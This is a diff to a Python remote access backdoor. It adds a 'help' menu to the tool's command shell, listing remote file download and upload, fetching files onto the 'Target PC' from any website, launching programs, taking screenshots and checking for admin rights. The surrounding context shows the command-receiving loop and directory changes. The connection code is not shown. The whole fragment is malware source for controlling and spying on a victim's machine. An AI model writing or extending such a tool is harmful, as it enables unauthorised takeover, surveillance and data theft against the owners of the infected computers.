@@ -8,6 +8,7 @@ import shutil
 import sys
 import base64
 import requests
+from requests.api import options
 from mss import mss
 
 def reliable_send(data):
@@ -55,6 +56,14 @@ def shell():
         command = reliable_receive()
         if command == "q":
             break
+        elif command == "help":
+            help_options = '''download path -> Download A file From Target PC
+            upload path-> Upload A file To Target PC
+            get url-> Download File To Target From Any Website
+            start path  -> Start A Program In Target PC
+            screenshot -> Take Screenshot Of Target PC
+            check  -> Check If Target PC Is Admin Or Not'''
+            reliable_send(help_options)
         elif command[:2] == "cd" and len(command) > 1:
             try:
                 os.chdir(command[3:])
